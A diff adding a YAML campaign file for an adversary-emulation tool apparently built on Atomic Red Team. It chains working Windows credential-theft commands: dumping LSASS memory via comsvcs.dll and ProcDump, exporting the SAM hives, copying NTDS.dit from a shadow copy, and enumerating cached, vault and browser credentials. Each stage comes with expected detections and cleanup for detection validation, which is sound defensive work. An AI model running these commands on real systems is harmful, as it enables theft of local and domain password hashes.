@@ -1,0 +1,172 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: art-credential-access-windows
+  adversary: Atomic Red Team
+  description: "Real credential access techniques using Atomic Red Team tests on Windows"
+  objective: "Execute real credential dumping techniques to validate detection of LSASS access, SAM extraction, and credential harvesting"
+  mitre_version: "15.1"
+  severity: critical
+  tags: [art, atomic-red-team, credential-access, windows, live-execution]
+  authors: ["ThreatEcho"]
+  references:
+    - https://github.com/redcanaryco/atomic-red-team
+    - https://attack.mitre.org/tactics/TA0006/
+  created: "2024-08-15"
+  modified: "2026-09-14"
+
+variables:
+  art_path: "C:\\AtomicRedTeam"
+  dump_path: "C:\\Windows\\Temp\\lsass_dump.dmp"
+
+stages:
+  - id: lsass-comsvcs
+    name: "LSASS Dump via comsvcs.dll"
+    description: "Dump LSASS process memory using comsvcs.dll MiniDump — the technique APT groups use to avoid dropping Mimikatz to disk"
+    technique: T1003.001
+    tactic: credential-access
+    platform: [windows]
+    execute:
+      type: powershell
+      commands:
+        - '$p = Get-Process lsass; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p.Id C:\Windows\Temp\lsass_dump.dmp full; if (Test-Path C:\Windows\Temp\lsass_dump.dmp) { "LSASS dump created" } else { throw "LSASS dump failed — PPL or AV may be blocking" }'
+      elevated: true
+      cleanup:
+        - 'Remove-Item C:\Windows\Temp\lsass_dump.dmp -Force -ErrorAction SilentlyContinue'
+    expect:
+      telemetry: [process_create, process_access, file_write]
+      detections: [lsass_memory_access, credential_dumping_comsvcs, suspicious_rundll32]
+      artifacts: ["C:\\Windows\\Temp\\lsass_dump.dmp"]
+    on_success: lsass-procdump
+    on_failure: continue
+    timeout: 30s
+
+  - id: lsass-procdump
+    name: "LSASS Dump via ProcDump"
+    description: "Use Sysinternals ProcDump to capture LSASS — a signed Microsoft binary, harder to detect"
+    technique: T1003.001
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [lsass-comsvcs]
+    execute:
+      type: powershell
+      commands:
+        - 'if (Get-Command procdump.exe -ErrorAction SilentlyContinue) { procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_procdump.dmp } else { throw "procdump.exe not found in PATH — download from Sysinternals" }'
+      elevated: true
+      cleanup:
+        - 'Remove-Item C:\Windows\Temp\lsass_procdump.dmp -Force -ErrorAction SilentlyContinue'
+    expect:
+      telemetry: [process_create, process_access, file_write]
+      detections: [procdump_lsass, credential_dumping_sysinternals]
+      artifacts: ["C:\\Windows\\Temp\\lsass_procdump.dmp"]
+    on_success: sam-reg-save
+    on_failure: continue
+    timeout: 30s
+
+  - id: sam-reg-save
+    name: "SAM Registry Hive Extraction"
+    description: "Extract SAM, SYSTEM, and SECURITY registry hives — contains local account password hashes"
+    technique: T1003.002
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [lsass-procdump]
+    execute:
+      type: powershell
+      commands:
+        - 'reg save HKLM\SAM C:\Windows\Temp\sam.hive /y'
+        - 'reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y'
+        - 'reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y'
+      elevated: true
+      cleanup:
+        - 'Remove-Item C:\Windows\Temp\sam.hive, C:\Windows\Temp\system.hive, C:\Windows\Temp\security.hive -Force -ErrorAction SilentlyContinue'
+    expect:
+      telemetry: [process_create, registry_access]
+      detections: [sam_hive_export, registry_credential_extraction]
+      artifacts: ["C:\\Windows\\Temp\\sam.hive", "C:\\Windows\\Temp\\system.hive"]
+    on_success: ntds-vssadmin
+    on_failure: continue
+    timeout: 30s
+
+  - id: ntds-vssadmin
+    name: "NTDS.dit via Volume Shadow Copy"
+    description: "Extract Active Directory database (ntds.dit) using volume shadow copies — contains all domain password hashes"
+    technique: T1003.003
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [sam-reg-save]
+    execute:
+      type: powershell
+      commands:
+        - '$out = vssadmin.exe create shadow /for=C: 2>&1 | Out-String; $m = [regex]::Match($out, "Shadow Copy Volume Name:\s+(\S+)"); if (-not $m.Success) { throw "VSS creation failed: $out" }; $vol = $m.Groups[1].Value; cmd /c "copy $vol\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit /y" 2>&1; cmd /c "copy $vol\Windows\System32\config\SYSTEM C:\Windows\Temp\sys.hive /y" 2>&1; if (Test-Path C:\Windows\Temp\ntds.dit) { "NTDS.dit extracted" } else { "NTDS.dit not found (may not be a DC)" }'
+      elevated: true
+      cleanup:
+        - 'vssadmin.exe delete shadows /for=C: /quiet'
+        - 'Remove-Item C:\Windows\Temp\ntds.dit, C:\Windows\Temp\sys.hive -Force -ErrorAction SilentlyContinue'
+    expect:
+      telemetry: [process_create, file_read, file_write]
+      detections: [ntds_dit_extraction, vssadmin_shadow_creation, ad_credential_theft]
+      artifacts: ["C:\\Windows\\Temp\\ntds.dit"]
+    on_success: cached-creds
+    on_failure: continue
+    timeout: 60s
+
+  - id: cached-creds
+    name: "Cached Domain Credentials"
+    description: "Extract cached domain logon credentials from the registry"
+    technique: T1003.005
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [ntds-vssadmin]
+    execute:
+      type: shell
+      commands:
+        - 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount'
+        - 'reg query "HKLM\SECURITY\Cache" 2>nul || echo SECURITY\Cache not accessible (requires SYSTEM)'
+      elevated: true
+    expect:
+      telemetry: [registry_access]
+      detections: [cached_credential_access, security_hive_query]
+    on_success: credential-vault
+    on_failure: continue
+    timeout: 15s
+
+  - id: credential-vault
+    name: "Windows Credential Vault Enumeration"
+    description: "Enumerate saved credentials in Windows Credential Manager"
+    technique: T1555.004
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [cached-creds]
+    execute:
+      type: shell
+      commands:
+        - 'cmdkey /list'
+        - 'powershell.exe -Command "Get-ChildItem C:\Users\*\AppData\Local\Microsoft\Credentials\ -Force -ErrorAction SilentlyContinue"'
+        - 'powershell.exe -Command "Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Credentials\ -Force -ErrorAction SilentlyContinue"'
+      elevated: false
+    expect:
+      telemetry: [process_create, file_read]
+      detections: [credential_vault_enumeration, credential_file_access]
+    on_failure: continue
+    timeout: 15s
+
+  - id: browser-creds
+    name: "Browser Credential Extraction"
+    description: "Locate browser credential stores — Chrome, Firefox, Edge"
+    technique: T1555.003
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [credential-vault]
+    execute:
+      type: shell
+      commands:
+        - 'powershell.exe -Command "Get-ChildItem ''C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data'' -Force -ErrorAction SilentlyContinue | Select-Object FullName, Length"'
+        - 'powershell.exe -Command "Get-ChildItem ''C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json'' -Force -ErrorAction SilentlyContinue | Select-Object FullName, Length"'
+        - 'powershell.exe -Command "Get-ChildItem ''C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'' -Force -ErrorAction SilentlyContinue | Select-Object FullName, Length"'
+      elevated: false
+    expect:
+      telemetry: [file_read]
+      detections: [browser_credential_access, sensitive_file_read]
+    on_failure: continue
+    timeout: 15s
